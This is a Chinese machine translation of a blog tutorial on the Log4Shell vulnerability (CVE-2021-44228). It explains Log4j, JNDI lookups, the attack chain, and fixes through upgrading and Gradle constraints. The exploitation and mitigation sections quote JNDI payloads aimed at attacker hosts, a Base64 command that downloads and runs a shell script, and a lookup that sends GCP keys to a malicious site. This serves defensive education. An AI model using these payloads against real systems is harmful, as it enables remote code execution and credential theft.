<html>
<head>
<title>We Should Talk About Log4j…</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我们应该谈谈Log4j…</h1>
<blockquote>原文：<a href="https://blog.devgenius.io/we-should-talk-about-log4j-caabd6874a2c?source=collection_archive---------11-----------------------#2021-12-27">https://blog.devgenius.io/we-should-talk-about-log4j-caabd6874a2c?source=collection_archive---------11-----------------------#2021-12-27</a></blockquote><div><div class="fc ib ic id ie if"/><div class="ig ih ii ij ik"><div class=""/><p id="d224" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">有没有比毫无戒备地透露剧透更好的开篇方式？嗯，如果有的话，我会在未来使用它，但现在，我们只能说，自从<strong class="jm io"> <em class="ki"> Apache Log4j漏洞</em> </strong>于<em class="ki">12月9日</em>被披露以来，很多事情都处于危险之中，影响了Apache Log4j版本2.0到2.14.1 。该漏洞被命名为<strong class="jm io"><em class="ki">CVE-2021–44228</em></strong>，达到最高<em class="ki">严重等级10 </em>。</p><p id="be7c" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">这个被称为<strong class="jm io"><em class="ki">log 4 shell</em></strong><em class="ki">、c </em>的漏洞，使得威胁行为者有机会控制任何基于Java的面向互联网的服务器，并参与<em class="ki">远程代码执行(RCE) </em>攻击。来自<a class="ae kj" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" rel="noopener ugc nofollow" target="_blank">CVE-2021–44228详情</a>:</p><blockquote class="kk kl km"><p id="b5ac" class="jk jl ki jm b jn jo jp jq jr js jt ju kn jw jx jy ko ka kb kc kp ke kf kg kh ig bi translated">当启用消息查找替换时，可以控制日志消息或日志消息参数的攻击者可以执行从LDAP服务器加载的任意代码。</p></blockquote><p id="4510" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">据<a class="ae kj" href="https://www.cybereason.com/" rel="noopener ugc nofollow" target="_blank"> <em class="ki">安全公司</em> </a>称，这个漏洞的影响很可能非常广泛。已经有<a class="ae kj" href="https://arstechnica.com/information-technology/2021/12/minecraft-and-other-apps-face-serious-threat-from-new-code-execution-bug/" rel="noopener ugc nofollow" target="_blank">报道称，威胁行为者正在积极参与<em class="ki">大规模互联网扫描</em> </a>以识别易受攻击的服务器。然而，<em class="ki">不要害怕</em>，因为在这篇博客中，我们将解释特定的Log4j漏洞是什么，为什么它很重要，以及有哪些工具和资源可以帮助您避免恶意软件利用、网络攻击和其他与Log4j相关的网络安全风险。所以，让我们开始吧！</p><h2 id="f5a5" class="kq kr in bd ks kt ku dn kv kw kx dp ky jv kz la lb jz lc ld le kd lf lg lh li bi translated">Log4j是什么？</h2><p id="0b2b" class="pw-post-body-paragraph jk jl in jm b jn lj jp jq jr lk jt ju jv ll jx jy jz lm kb kc kd ln kf kg kh ig bi translated">你们中的许多人可能不是Java开发人员，只是对这个安全问题感到好奇，因为互联网正在为此疯狂。所以用几句话概括一下Log4j的功能并不是一个坏主意。</p><p id="64ee" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">观察发现，日志记录占据了代码的很大一部分。因此，即使是小应用程序也会包含数百条日志语句。将日志请求添加到应用程序代码中需要一些计划和努力。然而，像Log4j这样的不同日志框架使这个过程变得相当容易，Log4j是一个<strong class="jm io"> <em class="ki">开源日志库</em> </strong>，通常由互联网上的<em class="ki"> Java应用</em>和<em class="ki">服务</em>使用。基于问题的严重性，它方便地拥有<em class="ki">内置日志级别</em>和<em class="ki">消息</em>——关闭、致命、错误、警告、信息、调试和跟踪。</p><p id="60d8" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">让我们看看这是如何在一个非常简单的Java类的帮助下完成的，该类通过设置一个简单的配置来初始化并使用Log4j，该配置在<strong class="jm io"> <em class="ki">控制台</em> </strong>上登录:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="43fc" class="kq kr in lt b gy lx ly l lz ma">package <em class="ki">com.example.log4jdemo</em>;<br/><br/>import <em class="ki">org.apache.log4j.BasicConfigurator</em>;<br/>import <em class="ki">org.apache.logging.log4j.LogManager</em>;<br/>import <em class="ki">org.apache.logging.log4j.Logger</em>;<br/><br/>public class <em class="ki">Log4jExample </em>{<br/><br/>    private static final <em class="ki">Logger </em>LOGGER = <em class="ki">LogManager</em>.<em class="ki">getLogger</em>("<em class="ki">Log4jExample.class</em>");<br/><br/>    public static void main(<em class="ki">String</em>[] <em class="ki">args</em>) {<br/>        LOGGER.debug("Hello! This is a debug message");<br/>        LOGGER.info("Hello! This is an info message");<br/>    }<br/>}</span></pre><p id="6c45" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">首先，从<strong class="jm io"> <em class="ki">日志管理器</em> </strong>中获得一个具有类的完全限定名的日志记录器。接下来，记录器用于写入不同严重性级别的消息。这是运行类中的<strong class="jm io"> <em class="ki"> main() </em> </strong>方法后的输出:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="826a" class="kq kr in lt b gy lx ly l lz ma">21:44:59.797 [main] DEBUG com.example.springbootsecuritydemo.Log4jExample - Hello! This is a debug message<br/>21:44:59.800 [main] INFO com.example.springbootsecuritydemo.Log4jExample - Hello! This is an info message</span><span id="dd69" class="kq kr in lt b gy mb ly l lz ma">Process finished with exit code 0</span></pre><p id="04fc" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">日志记录的目的通常是提供关于系统中正在发生的事情的信息，这需要包括关于正在被操作的 对象的信息。这可以通过以下方式完成:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="58c6" class="kq kr in lt b gy lx ly l lz ma">logger.debug("Logging in user " + user.getName() + " with Email " + user.getEmail());</span></pre><p id="f652" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">然而，当您经常这样做时，代码开始看起来更像是关于日志而不是手头的任务。此外，日志级别被检查<em class="ki">两次</em>:一次在调用<strong class="jm io"><em class="ki">is debugenabled()</em></strong>期间，另一次在<strong class="jm io"> <em class="ki">调试程序</em> </strong>期间。更好的选择应该是这样的:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="b0b6" class="kq kr in lt b gy lx ly l lz ma">logger.debug("Logging in user {} with Email {}", user.getName(), user.getEmail());</span></pre><p id="2f56" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">使用上面的代码只会检查一次日志记录级别，并且只有在启用了调试日志记录的情况下才会进行字符串构造。虽然这种语法在处理日志问题时非常方便，但它实际上已经成为这条突发新闻的原因。和我呆在一起，我们一会儿将研究细节。</p><h2 id="3edc" class="kq kr in bd ks kt ku dn kv kw kx dp ky jv kz la lb jz lc ld le kd lf lg lh li bi translated">什么是JNDI？</h2><p id="8e0b" class="pw-post-body-paragraph jk jl in jm b jn lj jp jq jr lk jt ju jv ll jx jy jz lm kb kc kd ln kf kg kh ig bi translated">是时候在我们的教程中介绍一下<strong class="jm io"> <em class="ki"> JNDI </em> </strong>了，它代表<em class="ki"> Java命名和目录接口</em>。它是一个Java API，为Java应用程序提供名称和目录功能。您将需要JNDI类和一个或多个服务提供商来使用它。<em class="ki"> JDK </em>包括多个命名/目录服务的服务提供者，包括<strong class="jm io"> <em class="ki"> LDAP </em> </strong>(轻量级目录访问协议)<strong class="jm io"> <em class="ki"> RMI </em> </strong>(远程方法调用)注册表、<strong class="jm io"> <em class="ki"> DNS </em> </strong>(域名服务)。</p><p id="2031" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">JNDI允许分布式应用程序以抽象的、独立于资源的方式查找服务。本质上，这是一个更安全的替代方法，可以让属性文件包含您的JDBC连接信息，从而使部署更容易。简单来说，它就像一个<strong class="jm io"> <em class="ki">散列表</em> </strong>，带有一个<em class="ki">字符串键和代表web上资源的对象值</em>。</p><p id="d77f" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated"><strong class="jm io"> <em class="ki">如果没有JNDI </em> </strong>，应用程序将不得不硬编码远程资源的位置或访问信息，或者使其在配置中可用。维护这些数据既耗时又容易出错。例如，如果一个资源被移动到不同的服务器，使用不同的IP地址，所有使用它的应用程序必须用新信息更新。对JNDI来说没必要这样。只有该资源的资源绑定必须更新。应用程序仍然可以使用它的名称来访问它，并且重新定位是透明的。</p><p id="0c80" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">在一个<em class="ki"> Java EE应用服务器</em>上建立一个<em class="ki">数据库连接池</em>是最常见的用例。在该服务器上运行的任何应用程序都可以使用名为<strong class="jm io"><em class="ki">Java:comp/env/class</em></strong>的JNDI来访问它需要的连接，而不必知道连接的细节。<em class="ki">这里有你遗漏的任何警告标志吗？</em></p><h2 id="3bda" class="kq kr in bd ks kt ku dn kv kw kx dp ky jv kz la lb jz lc ld le kd lf lg lh li bi translated">JNDI如何适应大局？</h2><p id="cf2d" class="pw-post-body-paragraph jk jl in jm b jn lj jp jq jr lk jt ju jv ll jx jy jz lm kb kc kd ln kf kg kh ig bi translated">正如你已经知道的，Log4j允许你<strong class="jm io"> <em class="ki">记录表达式</em> </strong>。看一下这段代码:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="ecd9" class="kq kr in lt b gy lx ly l lz ma">package <em class="ki">com.example.log4jdemo</em>;<br/><br/>import <em class="ki">org.apache.log4j.BasicConfigurator</em>;<br/>import <em class="ki">org.apache.logging.log4j.LogManager</em>;<br/>import <em class="ki">org.apache.logging.log4j.Logger</em>;<br/><br/>public class <em class="ki">Log4jExample </em>{<br/><br/>    private static final <em class="ki">Logger </em>LOGGER = <em class="ki">LogManager</em>.<em class="ki">getLogger</em>("HelloWorld");<br/><br/>    public static void main(<em class="ki">String</em>[] <em class="ki">args</em>) {<br/>        LOGGER.error("Error message: {}", error.getMessage());<br/>    }<br/>}</span></pre><p id="acae" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">您在这里所做的是<em class="ki">将来自<em class="ki">错误对象</em>的错误消息</em>放入<em class="ki">字符串</em>中。因此，Java将<strong class="jm io"> <em class="ki">运行这段代码</em> </strong>，然后将值插入字符串，输出将包含表达式右边部分执行代码的结果。</p><p id="4e16" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">只要我们将对象及其属性发送给我们的日志记录器，这就是典型的日志记录。这是不言而喻的，本身不是问题。不过，暂且考虑一下<strong class="jm io"> <em class="ki"> JNDI </em> </strong>。你还记得这是干什么用的吗？它允许我们在将Java对象序列化到您的<strong class="jm io"> <em class="ki"> JVM </em> </strong>之前，将<strong class="jm io"><em class="ki">Java对象保存在远程服务器<strong class="jm io"> <em class="ki">上。一个活动目录链接应该是这样的:<strong class="jm io"><em class="ki">LDAP://</em></strong><a class="ae kj" href="http://www.example.com:8000/dc=example,dc=com" rel="noopener ugc nofollow" target="_blank"><strong class="jm io"><em class="ki">www.example.com:8000/dc=example,dc=com</em></strong></a>。我们可以使用这个URL从另一个位置检索一个序列化的Java对象。这个和Log4j没关系。这是一个已经存在了相当一段时间的<strong class="jm io"> <em class="ki"> Java功能</em> </strong>。</em></strong></em></strong></p><p id="d492" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">好吧，现在拿起你的爆米花，坐好了… </p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/b1d0686a885f67d767cf3134407b121c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*Svo-YFwhvr7HH8TJQ1YDcg.gif"/></div></figure><p id="ff1e" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">几年前，Log4j中引入了<strong class="jm io"> <em class="ki"> JNDI查找特性</em> </strong>，它允许您从日志消息中进行JNDI查找。下面是一个很好的用例，例如，您在一个配置服务器上有一个集中的日志记录配置，您希望通过JNDI序列化它，并让它影响日志记录消息，比如日志记录路径或前缀。上面的代码看起来是这样的:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="d610" class="kq kr in lt b gy lx ly l lz ma">public static void main(<em class="ki">String</em>[] <em class="ki">args</em>) {<br/>        LOGGER.error("{}: Error message: {}", "${jndi:ldap://logconfig/prefix}", error.getMessage());<br/>    }</span></pre><p id="3e79" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">我们实际上是在传递一个<strong class="jm io"> <em class="ki"> URL </em> </strong>而不是一个值。这不是Java能解决的问题。我们将这个传递给Log4j。语法<strong class="jm io"> <em class="ki"> ${…} </em> </strong>指示Log4j实际搜索它。在这里，我们已经看到了它所有威严的弱点。</p><p id="ca05" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">简单提示一下，Log4j支持<strong class="jm io"> <em class="ki">不安全的JNDI查找</em> </strong>，这可能允许未经认证的<em class="ki"/>，<em class="ki">远程攻击者</em>，<em class="ki">以易受攻击的Java应用程序的权限通过<em class="ki"> LDAP、RMI、</em>和<em class="ki"> DNS </em>执行任意代码</em>。但是，问题依然存在:<strong class="jm io"> <em class="ki">如何？</em>T29】</strong></p><h2 id="9a59" class="kq kr in bd ks kt ku dn kv kw kx dp ky jv kz la lb jz lc ld le kd lf lg lh li bi translated">Log4j漏洞如何被利用？</h2><p id="9162" class="pw-post-body-paragraph jk jl in jm b jn lj jp jq jr lk jt ju jv ll jx jy jz lm kb kc kd ln kf kg kh ig bi translated">让我用一个来自<a class="ae kj" href="https://www.secureworks.com/blog/log4j-vulnerability-faqs" rel="noopener ugc nofollow" target="_blank"><strong class="jm io"><em class="ki">SecureWorks</em></strong></a>的又好又简单的例子:</p><blockquote class="kk kl km"><p id="1591" class="jk jl ki jm b jn jo jp jq jr js jt ju kn jw jx jy ko ka kb kc kp ke kf kg kh ig bi translated">1.威胁参与者可能会向易受攻击的机器发送一个包含恶意有效负载的特制字符串。系统记录的任何字段，如用户代理字符串、推荐人、用户名或电子邮件地址、设备名称或自由文本输入，都可能包含此字符串。</p><p id="320c" class="jk jl ki jm b jn jo jp jq jr js jt ju kn jw jx jy ko ka kb kc kp ke kf kg kh ig bi translated">2.该字符串可能类似于<strong class="jm io">$ { JNDI:LDAP://attacker . com/a }</strong>——其中attacker.com是威胁参与者控制的<strong class="jm io"> LDAP服务器</strong>——被传递给Log4j进行记录。</p><p id="0b26" class="jk jl ki jm b jn jo jp jq jr js jt ju kn jw jx jy ko ka kb kc kp ke kf kg kh ig bi translated">3.Log4j漏洞由该有效载荷触发<strong class="jm io">并且易受攻击的系统使用JNDI来<strong class="jm io">查询</strong>威胁参与者控制的LDAP服务器。</strong></p><p id="d75d" class="jk jl ki jm b jn jo jp jq jr js jt ju kn jw jx jy ko ka kb kc kp ke kf kg kh ig bi translated">4.威胁参与者控制的LDAP服务器<strong class="jm io">用包括<strong class="jm io">远程Java类文件</strong>的信息来响应</strong>(例如，hXXp://second-stage . attack . com/exploit . class)。</p><p id="633b" class="jk jl ki jm b jn jo jp jq jr js jt ju kn jw jx jy ko ka kb kc kp ke kf kg kh ig bi translated">5.这个Java类被<strong class="jm io">反序列化</strong>(下载)和<strong class="jm io">执行</strong>。</p></blockquote><p id="e3b0" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">这个由<strong class="jm io"> <em class="ki">瑞士</em></strong><a class="ae kj" href="https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/" rel="noopener ugc nofollow" target="_blank"><strong class="jm io"><em class="ki">CERT</em></strong></a>组成的图形视图很好地说明了这个攻击链:</p><figure class="lo lp lq lr gt md gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi mg"><img src="../Images/6472c532522fd8865600c4c3bda59c25.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CAKMTjzihhFcupD4xJiJBQ.png"/></div></div><figcaption class="ml mm gj gh gi mn mo bd b be z dk translated">CERT发起的Log4j JNDI攻击的图形视图</figcaption></figure><p id="f89f" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">对于那些仍然不确定攻击者如何获得对您系统的访问权并向您的日志记录器传输特殊构造的字符串的人，让我提供一个例子。假设你有一个搜索页面，用户可以在输入表单中输入搜索参数，你的应用程序会接受并搜索这些参数——很简单。你将搜索标准记录在你的应用程序中。嗯……这里会出什么问题呢？T13】</p><p id="0af0" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">想象一下，如果有人放入以下内容会怎么样:<strong class="jm io"><em class="ki">$ { JNDI:LDAP://恶意站点/恶意对象} </em> </strong>。这段代码会做什么？该代码将向参数中指定的域发送JNDI请求。我相信你现在对这个问题有了新的看法。您的<em class="ki"> JVM </em>现在包含一个恶意对象。这听起来很疯狂，但它不是无缘无故地被称为零日漏洞，对吗？</p><p id="5f4e" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">如果你真的能够在一个主流网站的JVM中为你的代码创建一个Java对象，你将得到<strong class="jm io"> <em class="ki">对一切的完全控制。你可以在任何时候运行任何你想运行的代码。这被称为RCE(远程代码执行)。根据<strong class="jm io"> <em class="ki"> SecureWorks </em> </strong>的说法，事实上，这正是大多数攻击者试图通过传递<strong class="jm io"> <em class="ki"> Base64编码的</em> </strong>命令来做下载<strong class="jm io"> <em class="ki">加密货币矿工</em> </strong>之类的事情。例如下面的<em class="ki"> Base64 </em>:</em></strong></p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="201a" class="kq kr in lt b gy lx ly l lz ma">{jndi:ldap://&lt;redacted_IP&gt;:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9s</span></pre><p id="ade0" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated"><em class="ki">将</em>解码为:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="1807" class="kq kr in lt b gy lx ly l lz ma">wget hXXp://62.210.130[.]250/lh.sh;chmod +x lh.sh;./l</span></pre><p id="7bca" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">简单的说，突击利用Log4j漏洞下载<strong class="jm io"> <em class="ki">软件</em> </strong>，然后发起下载一个<strong class="jm io"> <em class="ki">。exe文件</em> </strong>，然后安装一个<strong class="jm io"> <em class="ki">的crypto-miner </em> </strong>。一旦安装完毕，加密矿工就开始<em class="ki">利用受害者的资源</em>为攻击者的利益挖掘加密货币，所有的<strong class="jm io"> <em class="ki">都不会让受害者意识到</em> </strong>他们已经被黑了。</p><p id="0c07" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">这个漏洞被命名为<strong class="jm io"> <em class="ki"> Log4Shell </em> </strong>是有原因的。几乎就像任何人都可以在任何服务器上打开一个shell并发出命令。<strong class="jm io"> <em class="ki">是啊，就那么差！</em> </strong></p><h2 id="340d" class="kq kr in bd ks kt ku dn kv kw kx dp ky jv kz la lb jz lc ld le kd lf lg lh li bi translated">解决方法是什么？</h2><p id="e97c" class="pw-post-body-paragraph jk jl in jm b jn lj jp jq jr lk jt ju jv ll jx jy jz lm kb kc kd ln kf kg kh ig bi translated">在本教程结束时，您可能会想，“<em class="ki">嗯，这对我很好，因为我没有使用Log4j… </em>”但是，<em class="ki">您有多确定</em>？您的库可能使用Log4j进行日志记录，即使您没有直接使用它，或者它们可能使用其他利用Log4j进行日志记录的库。这个循环永无止境。鉴于Log4j的流行，任何运行在互联网上的适当规模的Java应用程序都可能安装了它。</p><p id="a82e" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">首先，解决这个问题最简单的方法是通过在JVM中<strong class="jm io"> <em class="ki">设置几个标志为假</em> </strong>来<strong class="jm io">阻止任何来自外部URL</strong>的代码:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="76dd" class="kq kr in lt b gy lx ly l lz ma">com.sun.jndi.ldap.object.trustURLCodebase<br/>con.sunjndi.rmi.object.trustURLCodebase</span></pre><p id="351a" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">然而，即使这些标志被禁用，并且您的JVM不信任并反序列化它接收到的对象，如果进行了调用，您可能仍然会遇到<strong class="jm io"> <em class="ki">环境变量</em> </strong>的问题。看一看以下内容:</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="8650" class="kq kr in lt b gy lx ly l lz ma">${jndi:ldap://www.maliciouswebsite.com:1234/${env:GCP_ACCESS_KEY_ID}/${env:GCP_SECRET_ACCESS_KEY}}</span></pre><p id="a665" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">您的键值很可能会被保存为环境变量，您会将这些变量传输到恶意站点。即使你不信任来电回复，但电话已经打了，数据也已经转移了。你的<strong class="jm io"> <em class="ki">访问</em> </strong>和<strong class="jm io"> <em class="ki">秘密</em> </strong>的钥匙将会在黑客手中。</p><p id="1fb7" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">为了避免所有这些混乱，你必须首先<strong class="jm io"> <em class="ki">更新Log4j到一个更新的版本</em> </strong> (2.16或更高)。Log4j <strong class="jm io"> <em class="ki"> 2.16.0 </em> </strong>(对于Java 8或更高版本)中禁用了消息查找功能，并且为了缓解CVE-2021–44228和CVE-2021–45046，JNDI在默认情况下处于禁用状态。此外，从版本<strong class="jm io"> <em class="ki"> 2.17.0 </em> </strong>(对于Java 8)开始，JNDI连接中不再支持LDAP协议，仅支持Java协议。</p><p id="9a20" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">这是一个简单的方法，但是如果你有很多<em class="ki">交织</em>的依赖关系，这可能会导致问题。另一个选择是<strong class="jm io"> <em class="ki">直接给类</em> </strong>打补丁，这样就不用手动升级每个依赖的版本了。</p><p id="9edc" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">如果你使用Gradle，还有一个叫做<strong class="jm io"> <em class="ki">的依赖约束</em> </strong>的东西。下面这段代码基本上是说你想要某个版本的库，不考虑依赖关系，而且必须是<strong class="jm io"> <em class="ki">严格更新</em> </strong>到2.16以上。</p><pre class="lo lp lq lr gt ls lt lu lv aw lw bi"><span id="9cbc" class="kq kr in lt b gy lx ly l lz ma"><em class="ki">dependencies </em>{<br/>    <em class="ki">constraints </em>{<br/>        <em class="ki">implementation("org.apache.logging.log4j</em>:log4j-core") {<br/>            <em class="ki">version </em>{<br/>                <em class="ki">strictly("[2.16, </em>3[")<br/>                <em class="ki">prefer("2.16.0)<br/>            }<br/>            because("CVE-2021-44228</em>: Log4j vulnerable to remote code execution")<br/>        <em class="ki">}<br/>    }<br/>}</em></span></pre></div><div class="ab cl mp mq hr mr" role="separator"><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu mv"/><span class="ms bw bk mt mu"/></div><div class="ig ih ii ij ik"><p id="e84b" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">你可能已经猜到了，在黑客进入你的机器之前，尽快解决这个<strong class="jm io"><em class="ki"/></strong>是很关键的。感兴趣的读者可以在互联网上找到一些资源，提供全面的<a class="ae kj" href="https://www.secureworks.com/blog/log4j-vulnerability-faqs" rel="noopener ugc nofollow" target="_blank"> <strong class="jm io"> <em class="ki">问答环节</em> </strong> </a>。Google还编制了一份受影响的500个包 的列表   <strong class="jm io"> <em class="ki">，其中包括一些最重要的传递性使用。作为维护者或用户优先考虑这些包可能会最大化您的影响。</em></strong></p><p id="5f80" class="pw-post-body-paragraph jk jl in jm b jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ig bi translated">总而言之，检查您的系统的Log4j使用情况，查看易受影响的应用程序列表，联系软件供应商，配置web应用程序防火墙规则，监控扫描活动，监控漏洞利用，保持消息灵通，当然，<strong class="jm io"> <em class="ki">不要错过我未来的文章</em> </strong>！</p></div></div>    
</body>
</html>